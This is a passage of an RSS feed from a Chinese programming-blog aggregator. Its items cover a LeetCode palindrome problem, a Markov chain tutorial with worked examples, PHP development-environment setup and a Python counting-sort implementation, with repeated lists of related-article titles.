本文实现的功能&amp;#xff1a;基于STM32F103C8T6实现的OV7670摄像头模组实时在2.2寸TFT彩屏上显示出来 
所需硬件&amp;#xff1a; STM32F103C8T6最小系统板、OV76…阅读更多...Linux-第一章目录 1.操作系统概述&amp;#xff1a; 
学习目标&amp;#xff1a; 
Ⅰ.了解操作系统的作用&amp;#xff1a; 
-硬件和软件&amp;#xff1a; 
-操作系统&amp;#xff1a; 
Ⅱ.了解常见的操作系统&amp;#xff1a; 
2.Linux初识&amp;#xff1a; 
学习目标&amp;#xff1a; 
Ⅰ.了解Linux系统的诞生&amp;#xff1a; 
…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径Oracle数据库七种闪回技术详解与实践示例分享一个Oracle表空间自动扩容与清理脚本精密封装，“芯”系未来：哲讯科技SAP解决方案引领芯片封装产业智造升级2025年市场上卷饼机厂家排行榜：权威推荐与选择指南2025年市场上​    烤鸭饼机工厂推荐榜：揭秘行业领先的烤鸭饼机制造商选择指南2025年市场上烙馍机生产厂家推荐：深度解析领先企业与技术创新Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 09:52:41 +0000</pubDate>
    </item>
    <item>
      <title>闯关leetcode——125. Valid Palindrome</title>
      <link>https://www.ppmy.cn/news/1540338.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维闯关leetcode——125. Valid Palindromenews/2025/10/31 17:52:40/大纲题目地址内容解题代码地址题目地址https://leetcode.com/problems/valid-palindrome/description/内容A phrase is a palindrome if, after converting all uppercase letters into lowercase letters and removing all non-alphanumeric characters, it reads the same forward and backward. Alphanumeric characters include letters and numbers.Given a string s, return true if it is a palindrome, or false otherwise.Example 1:Input: s = “A man, a plan, a canal: Panama”Output: trueExplanation: “amanaplanacanalpanama” is a palindrome.Example 2:Input: s = “race a car”Output: falseExplanation: “raceacar” is not a palindrome.Example 3:Input: s = " "Output: trueExplanation: s is an empty string “” after removing non-alphanumeric characters.Since an empty string reads the same forward and backward, it is a palindrome.Constraints:1 &lt;= s.length &lt;= 2 * 105s consists only of printable ASCII characters.解题这题就是要检测字符串中字符和字母是否是回文。这样我们就要过滤掉所有不是数字和字母的内容，然后去比较。解题的思路也很简单：两个方向相向而行，然后过滤掉所有不是数字和字母的，只要发现不符合回文特点就返回false。当两个方向下标相遇后，就说明对比结束。如果此时还没返回false，说明内容符合回文特点。代码地址https://github.com/f304646673/leetcode/tree/main/125-Valid-Palindromehttp://www.ppmy.cn/news/1540338.html相关文章专业学习｜马尔可夫链（概念、变体以及例题）一、马尔可夫链的概念及组成 
&amp;#xff08;一&amp;#xff09;学习资料分享 来源&amp;#xff1a;024-一张图&amp;#xff0c;但讲懂马尔可夫决策过程_哔哩哔哩_bilibili 马尔可夫链提供了一种建模随机过程的方法&amp;#xff0c;具有广泛的应用。在实际问题中&amp;#xff0c;通过转移概率矩阵及初…阅读更多...从零开始学PHP之安装开发环境前言 
不整那些虚的&amp;#xff0c;直接开始上干货&amp;#xff0c;争取让小白也看得懂 
环境选择 
php开发环境一般分为集成环境和编译环境&amp;#xff0c;由于编辑环境费时费力&amp;#xff08;我没搞明白&amp;#xff09;直接使用集成环境&amp;#xff0c;市面上php的集成环境很多我这里用的是phps…阅读更多...leetcode计数排序计数排序&amp;#xff08;counting sort&amp;#xff09;通过统计元素数量来实现排序&amp;#xff0c;通常应用于整数数组。 给定一个长度为 的数组 nums &amp;#xff0c;其中的元素都是“非负整数” def counting_sort(nums: list[int]):"""计数排序"""# 完整实…阅读更多...Libevent源码剖析之reactor1 简介 reactor 是一种事件驱动的并发处理模式&amp;#xff0c;常用于网络服务器和事件循环系统中。它主要的功能是通过单线程或者多线程处理I/O操作&amp;#xff0c;避免阻塞&amp;#xff0c;并且能够高效处理大量并发的事件。 one loop per thread or process&amp;#xff0c;以下摘自 reacto…阅读更多...泛微E-Cology系统 CptInstock1Ajax SQL注入漏洞复现0x01 产品描述&amp;#xff1a; ‌   泛微E-Cology是一款专为中大型组织设计的数字化办公系统&amp;#xff0c;旨在创建高效协同的办公环境。‌ 该系统集成了智能化、平台化和全程数字化的特点&amp;#xff0c;通过智能语音交互、与其他异构系统的集成以及电子印章、电子签名等技术的应用&amp;a…阅读更多...STM32--基于STM32F103C8T6的OV7670摄像头显示本文介绍基于STM32F103C8T6实现的OV7670摄像头显示设计&amp;#xff08;完整资源及代码见文末链接&amp;#xff09; 
一、简介 
本文实现的功能&amp;#xff1a;基于STM32F103C8T6实现的OV7670摄像头模组实时在2.2寸TFT彩屏上显示出来 
所需硬件&amp;#xff1a; STM32F103C8T6最小系统板、OV76…阅读更多...Linux-第一章目录 1.操作系统概述&amp;#xff1a; 
学习目标&amp;#xff1a; 
Ⅰ.了解操作系统的作用&amp;#xff1a; 
-硬件和软件&amp;#xff1a; 
-操作系统&amp;#xff1a; 
Ⅱ.了解常见的操作系统&amp;#xff1a; 
2.Linux初识&amp;#xff1a; 
学习目标&amp;#xff1a; 
Ⅰ.了解Linux系统的诞生&amp;#xff1a; 
…阅读更多...Gee引擎架设教程：Gee引擎人形怪物设置，MonUseItems配置文件讲解人形怪物设置说明&amp;#xff1a;1、在Envir目录下增加MonUseItems目录&amp;#xff0c;放置怪的配置文件&amp;#xff0c;见MonUseItems目录2、Monster.DB范例&amp;#xff1a;战士;150;19;0;198;0;100;5000;0;10;10;0;0;0;0;88;45;450;1;0;450;5000;法师;150;19;0;198;0;100;5000;0;10;10;0;…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径Oracle数据库七种闪回技术详解与实践示例分享一个Oracle表空间自动扩容与清理脚本精密封装，“芯”系未来：哲讯科技SAP解决方案引领芯片封装产业智造升级2025年市场上卷饼机厂家排行榜：权威推荐与选择指南2025年市场上​    烤鸭饼机工厂推荐榜：揭秘行业领先的烤鸭饼机制造商选择指南2025年市场上烙馍机生产厂家推荐：深度解析领先企业与技术创新Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 09:52:40 +0000</pubDate>
    </item>
    <item>
      <title>专业学习｜马尔可夫链（概念、变体以及例题）</title>
      <link>https://www.ppmy.cn/news/1540337.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维专业学习｜马尔可夫链（概念、变体以及例题）news/2025/10/31 17:52:38/一、马尔可夫链的概念及组成（一）学习资料分享来源：024-一张图，但讲懂马尔可夫决策过程_哔哩哔哩_bilibili马尔可夫链提供了一种建模随机过程的方法，具有广泛的应用。在实际问题中，通过转移概率矩阵及初始状态分布，我们可以推导出未来的状态概率。这使得马尔可夫链成为许多复杂系统分析中的重要工具。其余学习文章：马尔可夫链 ▏小白都能看懂的马尔可夫链详解-CSDN博客马尔可夫链 ▏小白都能看懂的马尔可夫链详解-CSDN博客基础知识：如何理解马尔可夫链？（二）概念马尔可夫链是一种随机过程，其特点是未来的状态只依赖于当前状态，而与过去的状态无关。这一特性称为“无记忆性”或“马尔可夫性质”。马尔可夫链广泛应用于各个领域，包括物理学、经济学、计算机科学等。（三）基本组成状态空间：马尔可夫链的所有可能状态的集合，通常用集合 ( S ) 表示。转移概率：从一个状态转移到另一个状态的概率，通常用转移概率矩阵 ( P ) 表示，其中 ( P(i,j) ) 表示从状态 ( i ) 转移到状态 ( j ) 的概率。初始状态分布：描述系统在起始时刻处于各状态的概率分布，通常用向量 ( \pi_0 ) 表示。（四）相关扩展变体1.隐马尔可夫模型（HMM）：在观察数据和隐藏状态之间建立联系的模型，常用于语音识别、自然语言处理等领域。改进点：隐藏状态：在HMM中，系统的状态是不可直接观察的，而只能通过与之相关的观测数据来推断。这与基本马尔可夫模型中的状态是可以直接观察到的情况不同。输出概率分布：HMM引入了从每个隐藏状态生成观测数据的概率分布，使得可以建模更复杂的现象。例如，一个隐藏状态可能对应于多个观测结果，这使得HMM能够处理更加复杂和不确定的情况。序列建模能力：HMM特别适合处理时序数据，比如语音信号或文本序列，通过学习隐藏状态序列与观测数据之间的关系，可以进行预测、分类等任务。2.时间非齐次马尔可夫链：转移概率随时间变化的马尔可夫链。改进点：动态转移概率：在时间非齐次马尔可夫链中，转移概率不仅依赖于当前状态，还依赖于时间。这意味着模型可以捕捉到时间变化带来的影响，能够更精确地描述某些过程，如经济周期的变化。灵活性：这种模型允许在不同时间点使用不同的转移概率矩阵，从而增强了模型的表达能力，可以更好地适应具有时间依赖性的实际应用场景。3.连续时间马尔可夫链：状态转移发生在连续时间上的马尔可夫链。改进点：时间参数化：在连续时间马尔可夫链中，状态转移发生在连续时间上，而不是离散的步骤。这种模型能够更真实地描述一些现实世界中的随机过程，例如排队系统、药物在体内的浓度变化等。指数分布的使用：状态转移间隔时间通常遵循指数分布，使得模型能够自然地处理事件发生的时间间隔，这是在离散时间马尔可夫链中无法实现的。更广泛的应用：连续时间马尔可夫链适用于许多需要实时监控和分析的领域，如生物统计学、金融工程和通信网络等。（五）例题（1）例题 0:  马尔可夫链例题1）例题描述假设有一个简单的天气模型，天气状态可以是“晴天”、“阴天”或“雨天”。状态空间 ( S = {晴天, 阴天, 雨天} )。已知转移概率矩阵如下：晴天阴天雨天晴天0.80.10.1阴天0.40.40.2雨天0.20.50.3假设今天是晴天，问明天天气为阴天的概率是多少？2）解题讲解确定初始状态：根据题意，今天是晴天，因此初始状态分布可以表示为：利用转移概率矩阵：我们需要找出从“晴天”到“阴天”的转移概率。根据转移概率矩阵，我们可以看到：最终结果：因此，如果今天是晴天，则明天天气为阴天的概率为 ( 0.1 )。（2）例题 1：隐马尔可夫模型（HMM）1）问题描述假设有一个隐马尔可夫模型用于识别天气状态与观察到的气象。隐藏状态为“晴天”、“阴天”、“雨天”，观察状态为“户外活动”、“在家”。已知转移概率矩阵和发射概率矩阵如下：转移概率矩阵 ( P )：晴天阴天雨天晴天0.70.20.1阴天0.30.40.3雨天0.20.50.3发射概率矩阵 ( B )：户外活动在家晴天0.90.1阴天0.50.5雨天0.10.9如果今天观察到的是“户外活动”，求出最可能的天气状态序列。2）解题讲解为了求解这个问题，我们可以使用维特比算法，该算法用于寻找最有可能的状态序列。1.初始化：根据初始状态分布假设，假设初始状态均匀分布。计算每个状态的初始概率乘以观测概率：2.递推计算：对于后续的观测进行递推计算，每个状态计算最大概率路径：对于第二个观测（假设为“在家”），需要考虑前一步的转移概率和当前的观测概率。重复此过程直到最后一步，选择最大概率路径。3.回溯找到最优路径：在获得所有状态的最大概率后，回溯找到最优状态序列。（3）例题 2：时间非齐次马尔可夫链1）问题描述考虑一个市场状态模型，有两种状态：“上涨”和“下跌”。它们的转移概率不是固定不变的，而是随时间变化，如下表所示：时间上涨转上涨上涨转下跌下跌转上涨下跌转下跌t=10.60.40.30.7t=20.80.20.40.6假设在时刻 ( t=0 ) 的状态为“上涨”，计算在时刻 ( t=2 ) 时状态为“下跌”的概率。2）解题讲解确定初始状态：在时间 ( t=0 )，状态为“上涨”，即初始状态分布为：计算转移概率：从 ( t=0 ) 到 ( t=1 )：计算从 ( t=1 ) 到 ( t=2 )：已知在 ( t=1 ) 时状态分布为：接下来使用 ( t=2 ) 的转移概率矩阵进行计算：时间上涨转上涨上涨转下跌下跌转上涨下跌转下跌t=20.80.20.40.6计算在 ( t=2 ) 时状态分布：对于状态“上涨”和“下跌”，计算如下：状态“上涨”在时刻 ( t=2 ) 的概率：状态“下跌”在时刻 ( t=2 ) 的概率：结果：因此，在时刻 ( t=2 ) 状态为“下跌”的概率为 ( 0.36 )。（4）例题 3：吸收马尔可夫链1）问题描述考虑一个抽奖游戏，参与者可以处于以下三种状态：状态 0: 未中奖状态 1: 中了一等奖状态 2: 中了二等奖如果在状态 0，参与者以 50% 的概率中一等奖，以 30% 的概率中二等奖，以 20% 的概率继续保持在状态 0。已知奖金不再返回到状态 0，因此这是一个吸收马尔可夫链。求在多次抽奖后最终进入状态 1 或状态 2 的概率。2）解题讲解建立转移概率矩阵( P ):这里的第一行表示从状态 0 转移到其他状态的概率，第二、第三行分别表示状态 1 和状态 2 是吸收状态。求解吸收概率：定义 ( R ) 为吸收状态的概率矩阵，即只有状态 1 和状态 2 的转移概率。即:计算 ( B ) 为从未中奖状态（状态 0）转入各吸收状态的概率。首先，计算 ( Q ) 矩阵（非吸收状态间的转移概率）：求解吸收概率（续）：第一个方程表示，从状态 0 转移到状态 1 的概率包括直接转移到状态 1 的概率 ( 0.5 ) 和保持在状态 0 后再次转移到状态 1 的概率 ( 0.2p_1 )。第二个方程同理，表示从状态 0 转移到状态 2 的概率。我们已经建立了状态转移矩阵 ( P ) 和吸收概率矩阵 ( R )。现在，我们需要找到从未中奖状态（状态 0）进入状态 1 和状态 2 的最终概率。对于这个问题，我们可以通过计算期望吸收时间和对应的吸收概率来解决。首先，定义：( p_1 ): 从状态 0 进入状态 1 的概率( p_2 ): 从状态 0 进入状态 2 的概率因为状态 1 和状态 2 是吸收状态，所以在状态 0 下的转移可以写作：解方程：将第一个方程重组为：第二个方程同样重组为：结果：最后，我们得到了从状态 0 开始进入各个吸收状态的概率：从状态 0 进入状态 1 的概率 ( p_1 = 0.625 )从状态 0 进入状态 2 的概率 ( p_2 = 0.375 )验证：这两个概率的总和为 ( p_1 + p_2 = 0.625 + 0.375 = 1 )，符合概率性质。二、马尔可夫链与动态规划的联系和区别马尔可夫链和动态规划虽然在某些方面有交集，但它们的核心理念、应用目标和具体实现方法有所不同。理解这两者的关系和区别，有助于在实际问题中选择合适的工具和方法。（一）联系马尔可夫链和动态规划都是处理状态转移和决策过程的重要工具，它们之间存在如下联系：状态：二者都涉及状态的概念。在马尔可夫链中，状态是系统在某一时刻可能处于的情况；而在动态规划中，状态通常表示某个子问题的解决方案。转移：马尔可夫链关注状态之间的转移概率，而动态规划则关注从一个状态到下一个状态的决策过程。两者都利用先前的状态信息来推导后续状态。优化：动态规划常用于求解具有最优子结构性质的问题，而马尔可夫决策过程（MDP）是一种将动态规划应用于随机环境的方法。这使得动态规划可以处理带有不确定性的决策问题。递归关系：动态规划依赖于递归关系来定义状态间的转移；马尔可夫链也通过转移概率定义了状态之间的关系。（二）区别尽管马尔可夫链和动态规划有相似之处，但它们在目的、方法和应用等方面存在显著区别：目的：马尔可夫链：主要用于建模和分析随机过程，关注的是状态转移的概率分布。动态规划：主要用于寻找最优解，关注的是如何在给定条件下做出最佳决策。决策 vs. 预测：马尔可夫链：通常是被动的，描述现象的演化，可以用于预测未来状态的概率。动态规划：是主动的，制定决策以达到目标，通常涉及优化某个目标函数。模型类型：马尔可夫链：是一种随机模型，强调无记忆性和状态转移的随机性。动态规划：可以是确定性的，也可以是随机的，但其核心是通过分解问题并逐步构建解决方案。应用领域：马尔可夫链：广泛应用于统计学、金融、物理、计算机科学等领域，尤其是在序列数据和随机过程的分析中。动态规划：常用在运筹学、算法设计、计算机程序优化等领域，适用于背包问题、最长公共子序列等经典问题。http://www.ppmy.cn/news/1540337.html相关文章从零开始学PHP之安装开发环境前言 
不整那些虚的&amp;#xff0c;直接开始上干货&amp;#xff0c;争取让小白也看得懂 
环境选择 
php开发环境一般分为集成环境和编译环境&amp;#xff0c;由于编辑环境费时费力&amp;#xff08;我没搞明白&amp;#xff09;直接使用集成环境&amp;#xff0c;市面上php的集成环境很多我这里用的是phps…阅读更多...leetcode计数排序计数排序&amp;#xff08;counting sort&amp;#xff09;通过统计元素数量来实现排序&amp;#xff0c;通常应用于整数数组。 给定一个长度为 的数组 nums &amp;#xff0c;其中的元素都是“非负整数” def counting_sort(nums: list[int]):"""计数排序"""# 完整实…阅读更多...Libevent源码剖析之reactor1 简介 reactor 是一种事件驱动的并发处理模式&amp;#xff0c;常用于网络服务器和事件循环系统中。它主要的功能是通过单线程或者多线程处理I/O操作&amp;#xff0c;避免阻塞&amp;#xff0c;并且能够高效处理大量并发的事件。 one loop per thread or process&amp;#xff0c;以下摘自 reacto…阅读更多...泛微E-Cology系统 CptInstock1Ajax SQL注入漏洞复现0x01 产品描述&amp;#xff1a; ‌   泛微E-Cology是一款专为中大型组织设计的数字化办公系统&amp;#xff0c;旨在创建高效协同的办公环境。‌ 该系统集成了智能化、平台化和全程数字化的特点&amp;#xff0c;通过智能语音交互、与其他异构系统的集成以及电子印章、电子签名等技术的应用&amp;a…阅读更多...STM32--基于STM32F103C8T6的OV7670摄像头显示本文介绍基于STM32F103C8T6实现的OV7670摄像头显示设计&amp;#xff08;完整资源及代码见文末链接&amp;#xff09; 
一、简介 
本文实现的功能&amp;#xff1a;基于STM32F103C8T6实现的OV7670摄像头模组实时在2.2寸TFT彩屏上显示出来 
所需硬件&amp;#xff1a; STM32F103C8T6最小系统板、OV76…阅读更多...Linux-第一章目录 1.操作系统概述&amp;#xff1a; 
学习目标&amp;#xff1a; 
Ⅰ.了解操作系统的作用&amp;#xff1a; 
-硬件和软件&amp;#xff1a; 
-操作系统&amp;#xff1a; 
Ⅱ.了解常见的操作系统&amp;#xff1a; 
2.Linux初识&amp;#xff1a; 
学习目标&amp;#xff1a; 
Ⅰ.了解Linux系统的诞生&amp;#xff1a; 
…阅读更多...Gee引擎架设教程：Gee引擎人形怪物设置，MonUseItems配置文件讲解人形怪物设置说明&amp;#xff1a;1、在Envir目录下增加MonUseItems目录&amp;#xff0c;放置怪的配置文件&amp;#xff0c;见MonUseItems目录2、Monster.DB范例&amp;#xff1a;战士;150;19;0;198;0;100;5000;0;10;10;0;0;0;0;88;45;450;1;0;450;5000;法师;150;19;0;198;0;100;5000;0;10;10;0;…阅读更多...网页前端开发之HTML入门篇：链接标签 a链接标签 a 
&lt;a&gt;是HTML的链接标签&amp;#xff0c;其标签内容的是链接的标题&amp;#xff0c; 它是通过属性来设置链接的地址(URL)。 
属性说明 
href&amp;#xff1a;其值是链接的地址(URL)&amp;#xff1b;target&amp;#xff1a;其值是指定该如何打开链接&amp;#xff1b; 选项值_self&amp;#xf…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径Oracle数据库七种闪回技术详解与实践示例分享一个Oracle表空间自动扩容与清理脚本精密封装，“芯”系未来：哲讯科技SAP解决方案引领芯片封装产业智造升级2025年市场上卷饼机厂家排行榜：权威推荐与选择指南2025年市场上​    烤鸭饼机工厂推荐榜：揭秘行业领先的烤鸭饼机制造商选择指南2025年市场上烙馍机生产厂家推荐：深度解析领先企业与技术创新Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 09:52:39 +0000</pubDate>
    </item>
    <item>
      <title>从零开始学PHP之安装开发环境</title>
      <link>https://www.ppmy.cn/news/1540336.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维从零开始学PHP之安装开发环境news/2025/10/31 17:52:37/前言不整那些虚的，直接开始上干货，争取让小白也看得懂环境选择php开发环境一般分为集成环境和编译环境，由于编辑环境费时费力（我没搞明白）直接使用集成环境，市面上php的集成环境很多我这里用的是phpstudy（小皮面板）编辑器有很多种，记事本，Sublime Text ，phpstorm（推荐）等这里选择的是phpstorm，别问为啥，好用开始下载phpstudy 进行安装，根据电脑配置进行选择下载下载之后的压缩包进行解压缩解压之后，双击后缀为.exe的文件会弹出安装界面，可以选择自定义安装，选择安装目录，避免小笨蛋一股脑的安装到C盘这个是安装之后的界面，首页，点击启动服务点击创建网站其他的按照默认就行确认完成之后可以到根目录下的文件夹7. 打开浏览器输入刚才咱们创建的网站域名咱们的网站就搭建好了至此php开发环境搭建已完成，下期进行php的知识讲解（写出咱们第一个程序 helloworld）http://www.ppmy.cn/news/1540336.html相关文章leetcode计数排序计数排序&amp;#xff08;counting sort&amp;#xff09;通过统计元素数量来实现排序&amp;#xff0c;通常应用于整数数组。 给定一个长度为 的数组 nums &amp;#xff0c;其中的元素都是“非负整数” def counting_sort(nums: list[int]):"""计数排序"""# 完整实…阅读更多...Libevent源码剖析之reactor1 简介 reactor 是一种事件驱动的并发处理模式&amp;#xff0c;常用于网络服务器和事件循环系统中。它主要的功能是通过单线程或者多线程处理I/O操作&amp;#xff0c;避免阻塞&amp;#xff0c;并且能够高效处理大量并发的事件。 one loop per thread or process&amp;#xff0c;以下摘自 reacto…阅读更多...泛微E-Cology系统 CptInstock1Ajax SQL注入漏洞复现0x01 产品描述&amp;#xff1a; ‌   泛微E-Cology是一款专为中大型组织设计的数字化办公系统&amp;#xff0c;旨在创建高效协同的办公环境。‌ 该系统集成了智能化、平台化和全程数字化的特点&amp;#xff0c;通过智能语音交互、与其他异构系统的集成以及电子印章、电子签名等技术的应用&amp;a…阅读更多...STM32--基于STM32F103C8T6的OV7670摄像头显示本文介绍基于STM32F103C8T6实现的OV7670摄像头显示设计&amp;#xff08;完整资源及代码见文末链接&amp;#xff09; 
一、简介 
本文实现的功能&amp;#xff1a;基于STM32F103C8T6实现的OV7670摄像头模组实时在2.2寸TFT彩屏上显示出来 
所需硬件&amp;#xff1a; STM32F103C8T6最小系统板、OV76…阅读更多...Linux-第一章目录 1.操作系统概述&amp;#xff1a; 
学习目标&amp;#xff1a; 
Ⅰ.了解操作系统的作用&amp;#xff1a; 
-硬件和软件&amp;#xff1a; 
-操作系统&amp;#xff1a; 
Ⅱ.了解常见的操作系统&amp;#xff1a; 
2.Linux初识&amp;#xff1a; 
学习目标&amp;#xff1a; 
Ⅰ.了解Linux系统的诞生&amp;#xff1a; 
…阅读更多...Gee引擎架设教程：Gee引擎人形怪物设置，MonUseItems配置文件讲解人形怪物设置说明&amp;#xff1a;1、在Envir目录下增加MonUseItems目录&amp;#xff0c;放置怪的配置文件&amp;#xff0c;见MonUseItems目录2、Monster.DB范例&amp;#xff1a;战士;150;19;0;198;0;100;5000;0;10;10;0;0;0;0;88;45;450;1;0;450;5000;法师;150;19;0;198;0;100;5000;0;10;10;0;…阅读更多...网页前端开发之HTML入门篇：链接标签 a链接标签 a 
&lt;a&gt;是HTML的链接标签&amp;#xff0c;其标签内容的是链接的标题&amp;#xff0c; 它是通过属性来设置链接的地址(URL)。 
属性说明 
href&amp;#xff1a;其值是链接的地址(URL)&amp;#xff1b;target&amp;#xff1a;其值是指定该如何打开链接&amp;#xff1b; 选项值_self&amp;#xf…阅读更多...nginx的负载均衡配置和重定向upstream_check模块  配置文件详情    
upstream cluster1{server 10.0.0.4:80  weight1 max_fails3 fail_timeout30s;server 10.0.0.5:80  weight1 max_fsils3 fsil_tomeout;check interval3000 rise2 fall5 timeout1000 typehttp;check interval3000 rise2 fall5 timeout1000…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径Oracle数据库七种闪回技术详解与实践示例分享一个Oracle表空间自动扩容与清理脚本精密封装，“芯”系未来：哲讯科技SAP解决方案引领芯片封装产业智造升级2025年市场上卷饼机厂家排行榜：权威推荐与选择指南2025年市场上​    烤鸭饼机工厂推荐榜：揭秘行业领先的烤鸭饼机制造商选择指南2025年市场上烙馍机生产厂家推荐：深度解析领先企业与技术创新Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 09:52:37 +0000</pubDate>
    </item>
    <item>
      <title>leetcode计数排序</title>
      <link>https://www.ppmy.cn/news/1540335.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维leetcode计数排序news/2025/10/31 17:52:36/计数排序（counting sort）通过统计元素数量来实现排序，通常应用于整数数组。给定一个长度为 的数组 nums ，其中的元素都是“非负整数”defcounting_sort(nums:list[int]):"""计数排序"""# 完整实现，可排序对象，并且是稳定排序# 1. 统计数组最大元素 mm=max(nums)# 2. 统计各数字的出现次数# counter[num] 代表 num 的出现次数counter=[0]*(m+1)fornuminnums:counter[num]+=1# 3. 求 counter 的前缀和，将“出现次数”转换为“尾索引”# 即 counter[num]-1 是 num 在 res 中最后一次出现的索引foriinrange(m):counter[i+1]+=counter[i]# 4. 倒序遍历 nums ，将各元素填入结果数组 res# 初始化数组 res 用于记录结果n=len(nums)res=[0]*nforiinrange(n-1,-1,-1):num=nums[i]res[counter[num]-1]=num# 将 num 放置到对应索引处counter[num]-=1# 令前缀和自减 1 ，得到下次放置 num 的索引# 使用结果数组 res 覆盖原数组 numsforiinrange(n):nums[i]=res[i]计数排序只适用于非负整数。若想将其用于其他类型的数据，需要确保这些数据可以转换为非负整数，并且在转换过程中不能改变各个元素之间的相对大小关系。例如，对于包含负数的整数数组，可以先给所有数字加上一个常数，将全部数字转化为正数，排序完成后再转换回去。http://www.ppmy.cn/news/1540335.html相关文章Libevent源码剖析之reactor1 简介 reactor 是一种事件驱动的并发处理模式&amp;#xff0c;常用于网络服务器和事件循环系统中。它主要的功能是通过单线程或者多线程处理I/O操作&amp;#xff0c;避免阻塞&amp;#xff0c;并且能够高效处理大量并发的事件。 one loop per thread or process&amp;#xff0c;以下摘自 reacto…阅读更多...泛微E-Cology系统 CptInstock1Ajax SQL注入漏洞复现0x01 产品描述&amp;#xff1a; ‌   泛微E-Cology是一款专为中大型组织设计的数字化办公系统&amp;#xff0c;旨在创建高效协同的办公环境。‌ 该系统集成了智能化、平台化和全程数字化的特点&amp;#xff0c;通过智能语音交互、与其他异构系统的集成以及电子印章、电子签名等技术的应用&amp;a…阅读更多...STM32--基于STM32F103C8T6的OV7670摄像头显示本文介绍基于STM32F103C8T6实现的OV7670摄像头显示设计&amp;#xff08;完整资源及代码见文末链接&amp;#xff09; 
一、简介 
本文实现的功能&amp;#xff1a;基于STM32F103C8T6实现的OV7670摄像头模组实时在2.2寸TFT彩屏上显示出来 
所需硬件&amp;#xff1a; STM32F103C8T6最小系统板、OV76…阅读更多...Linux-第一章目录 1.操作系统概述&amp;#xff1a; 
学习目标&amp;#xff1a; 
Ⅰ.了解操作系统的作用&amp;#xff1a; 
-硬件和软件&amp;#xff1a; 
-操作系统&amp;#xff1a; 
Ⅱ.了解常见的操作系统&amp;#xff1a; 
2.Linux初识&amp;#xff1a; 
学习目标&amp;#xff1a; 
Ⅰ.了解Linux系统的诞生&amp;#xff1a; 
…阅读更多...Gee引擎架设教程：Gee引擎人形怪物设置，MonUseItems配置文件讲解人形怪物设置说明&amp;#xff1a;1、在Envir目录下增加MonUseItems目录&amp;#xff0c;放置怪的配置文件&amp;#xff0c;见MonUseItems目录2、Monster.DB范例&amp;#xff1a;战士;150;19;0;198;0;100;5000;0;10;10;0;0;0;0;88;45;450;1;0;450;5000;法师;150;19;0;198;0;100;5000;0;10;10;0;…阅读更多...网页前端开发之HTML入门篇：链接标签 a链接标签 a 
&lt;a&gt;是HTML的链接标签&amp;#xff0c;其标签内容的是链接的标题&amp;#xff0c; 它是通过属性来设置链接的地址(URL)。 
属性说明 
href&amp;#xff1a;其值是链接的地址(URL)&amp;#xff1b;target&amp;#xff1a;其值是指定该如何打开链接&amp;#xff1b; 选项值_self&amp;#xf…阅读更多...nginx的负载均衡配置和重定向upstream_check模块  配置文件详情    
